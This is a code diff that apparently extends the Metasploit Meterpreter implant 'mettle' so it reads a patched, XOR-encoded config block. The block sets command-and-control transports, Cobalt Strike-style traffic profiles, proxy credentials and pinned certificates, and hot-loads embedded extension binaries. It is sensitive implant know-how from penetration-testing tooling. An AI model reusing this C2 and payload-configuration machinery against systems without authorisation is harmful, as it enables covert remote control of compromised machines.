@@ -4,18 +4,22 @@
  * @file main.c
  */
 
+#include <arpa/inet.h>
 #include <getopt.h>
 #include <libgen.h>
 #include <signal.h>
+#include <stdint.h>
 #include <stdlib.h>
 #include <stdio.h>
 #include <string.h>
 #include <unistd.h>
 
 #include "argv_split.h"
+#include "extensions.h"
 #include "log.h"
 #include "mettle.h"
 #include "service.h"
+#include "tlv.h"
 
 static void usage(const char *name)
 {
@@ -239,6 +243,260 @@ void parse_default_args(struct mettle *m, int flags)
 	}
 }
 
+#define CONFIG_BLOCK_MAX 8192
+#define CONFIG_BLOCK_SIG "CONFIG_BLOCK"
+#define CONFIG_BLOCK_SIG_LEN 12
+
+/*
+ * 8KB placeholder for TLV-based configuration block.
+ * The framework patches this with a XOR-encoded TLV config packet.
+ */
+static char config_block_data[CONFIG_BLOCK_MAX] = CONFIG_BLOCK_SIG;
+
+static struct c2_verb_config *parse_c2_verb_group(struct tlv_packet *parent, uint32_t group_type)
+{
+	size_t vlen = 0;
+	void *vdata = tlv_packet_get_raw(parent, group_type, &vlen);
+	if (vdata == NULL || vlen == 0) {
+		return NULL;
+	}
+
+	struct tlv_packet *vp = tlv_packet_from_raw(group_type, vdata, vlen);
+	if (vp == NULL) {
+		return NULL;
+	}
+
+	struct c2_verb_config *vc = calloc(1, sizeof(*vc));
+	if (vc == NULL) {
+		tlv_packet_free(vp);
+		return NULL;
+	}
+
+	const char *s;
+	/*
+	 * A profile's `set uri` may list several candidate URIs, emitted as
+	 * repeated TLV_TYPE_C2_URI values. Collect them all; the request builder
+	 * picks one at random per request (Cobalt Strike semantics).
+	 */
+	struct tlv_iterator uri_it = {
+		.packet = vp,
+		.offset = 0,
+		.value_type = TLV_TYPE_C2_URI,
+	};
+	char *uri_s;
+	while ((uri_s = tlv_packet_iterate_str(&uri_it)) != NULL) {
+		char **tmp = realloc(vc->uris, sizeof(char *) * (vc->uri_count + 1));
+		if (tmp == NULL) break;
+		vc->uris = tmp;
+		vc->uris[vc->uri_count] = strdup(uri_s);
+		if (vc->uris[vc->uri_count] == NULL) break;
+		vc->uri_count++;
+	}
+
+	tlv_packet_get_u32(vp, TLV_TYPE_C2_ENC_INBOUND, (uint32_t *)&vc->enc_inbound);
+	tlv_packet_get_u32(vp, TLV_TYPE_C2_ENC_OUTBOUND, (uint32_t *)&vc->enc_outbound);
+	tlv_packet_get_u32(vp, TLV_TYPE_C2_ENC_UUID, (uint32_t *)&vc->enc_uuid);
+	tlv_packet_get_u32(vp, TLV_TYPE_C2_PREFIX_SKIP, (uint32_t *)&vc->prefix_skip);
+	tlv_packet_get_u32(vp, TLV_TYPE_C2_SUFFIX_SKIP, (uint32_t *)&vc->suffix_skip);
+
+	size_t len = 0;
+	void *raw;
+	raw = tlv_packet_get_raw(vp, TLV_TYPE_C2_PREFIX, &len);
+	if (raw && len > 0) {
+		vc->prefix = malloc(len);
+		if (vc->prefix) {
+			memcpy(vc->prefix, raw, len);
+			vc->prefix_len = len;
+		}
+	}
+	raw = tlv_packet_get_raw(vp, TLV_TYPE_C2_SUFFIX, &len);
+	if (raw && len > 0) {
+		vc->suffix = malloc(len);
+		if (vc->suffix) {
+			memcpy(vc->suffix, raw, len);
+			vc->suffix_len = len;
+		}
+	}
+	s = tlv_packet_get_str(vp, TLV_TYPE_C2_UUID_PREFIX);
+	if (s) vc->uuid_prefix = strdup(s);
+	s = tlv_packet_get_str(vp, TLV_TYPE_C2_UUID_SUFFIX);
+	if (s) vc->uuid_suffix = strdup(s);
+
+	s = tlv_packet_get_str(vp, TLV_TYPE_C2_UUID_GET);
+	if (s) vc->uuid_get = strdup(s);
+	s = tlv_packet_get_str(vp, TLV_TYPE_C2_UUID_HEADER);
+	if (s) vc->uuid_header = strdup(s);
+	s = tlv_packet_get_str(vp, TLV_TYPE_C2_UUID_COOKIE);
+	if (s) vc->uuid_cookie = strdup(s);
+
+	tlv_packet_free(vp);
+	return vc;
+}
+
+static int parse_config_block(struct mettle *m)
+{
+	/* Check if the config block has been patched (signature overwritten) */
+	if (strncasecmp(config_block_data, CONFIG_BLOCK_SIG, CONFIG_BLOCK_SIG_LEN) == 0) {
+		return -1;
+	}
+
+	/*
+	 * Layout when patched: [length:4 BE][config_bytes][zero padding].
+	 * Carrying the length explicitly avoids a trailing-null ambiguity —
+	 * the XOR-encoded config can legitimately end in 0x00.
+	 */
+	size_t data_len = ntohl(*(const uint32_t *)config_block_data);
+	if (data_len == 0 || data_len > CONFIG_BLOCK_MAX - 4) {
+		log_error("config block length %zu out of range", data_len);
+		return -1;
+	}
+
+	/* Feed the raw config bytes through the standard TLV packet reader */
+	struct buffer_queue *q = buffer_queue_new();
+	if (q == NULL) {
+		return -1;
+	}
+	buffer_queue_add(q, config_block_data + sizeof(const uint32_t), data_len);
+	struct tlv_packet *config = tlv_packet_read_buffer_queue(NULL, q);
+	buffer_queue_free(q);
+	if (config == NULL) {
+		log_error("failed to parse config block");
+		return -1;
+	}
+
+	struct tlv_dispatcher *td = mettle_get_tlv_dispatcher(m);
+	struct c2 *c2 = mettle_get_c2(m);
+
+	/* Extract UUID */
+	size_t uuid_len = 0;
+	void *uuid = tlv_packet_get_raw(config, TLV_TYPE_UUID, &uuid_len);
+	if (uuid && uuid_len > 0) {
+		tlv_dispatcher_set_uuid(td, uuid, uuid_len);
+	}
+
+	/* Extract Session GUID */
+	size_t guid_len = 0;
+	void *guid = tlv_packet_get_raw(config, TLV_TYPE_SESSION_GUID, &guid_len);
+	if (guid && guid_len > 0) {
+		tlv_dispatcher_set_session_guid(td, guid);
+	}
+
+	/* Extract session expiry */
+	uint32_t session_expiry = 0;
+	tlv_packet_get_u32(config, TLV_TYPE_SESSION_EXPIRY, &session_expiry);
+
+	/* Extract debug log path */
+	const char *debug_log = tlv_packet_get_str(config, TLV_TYPE_DEBUG_LOG);
+	if (debug_log) {
+		FILE *log_fp = fopen(debug_log, "a");
+		if (log_fp) {
+			log_init_file(log_fp);
+			log_set_level(3);
+		}
+	}
+
+	/* Iterate C2 transport groups */
+	struct tlv_iterator i = {
+		.packet = config,
+		.offset = 0,
+		.value_type = TLV_TYPE_C2,
+	};
+	size_t group_len = 0;
+	void *group_data;
+	int transports_added = 0;
+	while ((group_data = tlv_packet_iterate(&i, &group_len)) != NULL) {
+		struct tlv_packet *group = tlv_packet_from_raw(TLV_TYPE_C2, group_data, group_len);
+		if (group == NULL) {
+			continue;
+		}
+
+		const char *url = tlv_packet_get_str(group, TLV_TYPE_C2_URL);
+		if (url == NULL) {
+			tlv_packet_free(group);
+			continue;
+		}
+
+		struct c2_transport_config *tc = calloc(1, sizeof(*tc));
+		if (tc == NULL) {
+			tlv_packet_free(group);
+			continue;
+		}
+
+		tlv_packet_get_u32(group, TLV_TYPE_C2_COMM_TIMEOUT, &tc->comm_timeout);
+		tlv_packet_get_u32(group, TLV_TYPE_C2_RETRY_TOTAL, &tc->retry_total);
+		tlv_packet_get_u32(group, TLV_TYPE_C2_RETRY_WAIT, &tc->retry_wait);
+
+		const char *s;
+		s = tlv_packet_get_str(group, TLV_TYPE_C2_PROXY_URL);
+		if (s) tc->proxy_url = strdup(s);
+		s = tlv_packet_get_str(group, TLV_TYPE_C2_PROXY_USER);
+		if (s) tc->proxy_user = strdup(s);
+		s = tlv_packet_get_str(group, TLV_TYPE_C2_PROXY_PASS);
+		if (s) tc->proxy_pass = strdup(s);
+		s = tlv_packet_get_str(group, TLV_TYPE_C2_UA);
+		if (s) tc->user_agent = strdup(s);
+		s = tlv_packet_get_str(group, TLV_TYPE_C2_HEADERS);
+		if (s) tc->custom_headers = strdup(s);
+		s = tlv_packet_get_str(group, TLV_TYPE_C2_UUID);
+		if (s) tc->c2_uuid = strdup(s);
+
+		size_t hash_len = 0;
+		void *hash = tlv_packet_get_raw(group, TLV_TYPE_C2_CERT_HASH, &hash_len);
+		if (hash && hash_len > 0) {
+			tc->cert_hash = malloc(hash_len);
+			if (tc->cert_hash) {
+				memcpy(tc->cert_hash, hash, hash_len);
+				tc->cert_hash_len = hash_len;
+			}
+		}
+
+		/* Parse C2 GET/POST profile sub-groups */
+		tc->c2_get = parse_c2_verb_group(group, TLV_TYPE_C2_GET);
+		tc->c2_post = parse_c2_verb_group(group, TLV_TYPE_C2_POST);
+
+		c2_add_transport_uri_config(c2, url, tc);
+		transports_added++;
+		tlv_packet_free(group);
+	}
+
+	/*
+	 * Staged payloads ship a config block with session TLVs but no C2
+	 * groups — they inherit the stager's socket via argv "m <fd>". Tell
+	 * the caller "no transports here" so the fd-fallback branch runs.
+	 */
+	if (transports_added == 0) {
+		tlv_packet_free(config);
+		return -1;
+	}
+
+	/* Hot-load extensions baked into the config block (EXTENSIONS=) so
+	 * their commands are registered before the first C2 dispatch. */
+	struct tlv_iterator ext_it = {
+		.packet = config,
+		.offset = 0,
+		.value_type = TLV_TYPE_EXTENSION,
+	};
+	size_t ext_group_len = 0;
+	void *ext_group_data;
+	while ((ext_group_data = tlv_packet_iterate(&ext_it, &ext_group_len)) != NULL) {
+		struct tlv_packet *ext_group = tlv_packet_from_raw(TLV_TYPE_EXTENSION, ext_group_data, ext_group_len);
+		if (ext_group == NULL) {
+			continue;
+		}
+		size_t data_len = 0;
+		const unsigned char *ext_data = tlv_packet_get_raw(ext_group, TLV_TYPE_DATA, &data_len);
+		if (ext_data && data_len > 0) {
+			if (!extension_start_binary_image(m, "baked", ext_data, data_len, NULL)) {
+				log_error("Failed to hot-load baked extension");
+			}
+		}
+		tlv_packet_free(ext_group);
+	}
+
+	tlv_packet_free(config);
+	return 0;
+}
+
 /* Saves a copy of argv for setproctitle emulation */
 #ifndef HAVE_SETPROCTITLE
 static char **saved_argv;
@@ -268,9 +526,15 @@ int main(int argc, char * argv[])
 	}
 
 	/*
-	 * Check to see if we were injected by metasploit
+	 * Try TLV config block first — if present, it contains all config.
+	 * Fall back to CLI args / DEFAULT_OPTS if no config block.
 	 */
-	if (argv[0] != NULL && strcmp(argv[0], "m") == 0) {
+	if (parse_config_block(m) == 0) {
+		log_info("loaded configuration from TLV config block");
+	} else if (argv[0] != NULL && strcmp(argv[0], "m") == 0) {
+		/*
+		 * Check to see if we were injected by metasploit
+		 */
 		flags |= PAYLOAD_INJECTED;
 
 		/*
